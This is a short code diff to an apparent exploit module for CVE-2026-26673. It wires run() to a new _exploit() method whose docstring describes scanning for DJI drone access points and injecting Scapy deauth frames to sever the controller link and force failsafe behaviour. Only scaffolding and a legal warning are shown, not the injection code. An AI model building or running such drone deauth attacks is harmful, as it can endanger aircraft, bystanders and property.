@@ -114,7 +114,11 @@ class Exploit(HTTPClient):
 
     def run(self) -> None:
         print_warning("[LEGAL] Authorized use only. Deauth attacks on aircraft are illegal without authorization.")
+        self._exploit()
 
+    def _exploit(self) -> None:
+        """E2E CVE-2026-26673: scan for DJI APs, inject deauth frames
+        via Scapy to sever controller link, forcing failsafe behavior."""
         # Stage 1: Wi-Fi AP scan
         if self.do_scan:
             print_status("[Stage 1] Scanning for DJI drone APs (requires scapy + monitor mode)")
